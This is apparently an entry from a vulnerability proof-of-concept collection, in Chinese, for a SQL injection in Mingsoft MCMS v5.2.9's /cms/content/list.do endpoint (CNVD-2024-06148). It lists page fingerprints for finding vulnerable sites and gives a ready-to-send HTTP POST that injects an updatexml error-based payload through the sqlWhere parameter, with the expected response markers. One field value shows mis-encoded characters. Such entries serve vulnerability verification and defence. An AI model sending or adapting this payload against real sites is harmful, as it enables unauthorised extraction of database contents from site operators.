﻿# Mingsoft MCMS v5.2.9 前台查询文章列表接口 SQL注入

> 更新时间：2024-04-30

> 漏洞编号：CNVD-2024-06148

> 漏洞说明：MCMS是中国铭飞（MingSoft）公司的一个完整开源的J2ee系统。江西铭软科技有限公司MCMS v5.2.9版本存在SQL注入漏洞，该漏洞源于/content/list.do中的categoryType参数缺少对外部输入SQL语句的验证，攻击者可利用该漏洞获取数据库敏感数据。

> 漏洞特征：body="铭飞MCMS" || body="/mdiy/formData/save.do" || body="static/plugins/ms/1.0.0/ms.js"

> 验证脚本：HTTP

```
POST /cms/content/list.do HTTP/1.1
Connection: close
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate, br

categoryType=1&sqlWhere=%5b%7b%22action%22%3a%22and%22%2c%22field%22%3a%22updatexml(1%2cconcat(0x7e%2c(SELECT%20%20md5(1))%2c0x7e)%2c1)%22%2c%22el%22%3a%22eq%22%2c%22model%22%3a%22contentTitle%22%2c%22name%22%3a%22æç« æ é¢%22%2c%22type%22%3a%22input%22%2c%22value%22%3a%22111%22%7d%5d&pageNo=1&pageSize=10

```

> 响应代码特征：200

> 响应内容特征：a0b923820dcc509a

> 上传文件定位：

> 验证文件来源：Mingsoft MCMS v5.2.9 前台查询文章列表接口 SQL注入.poc

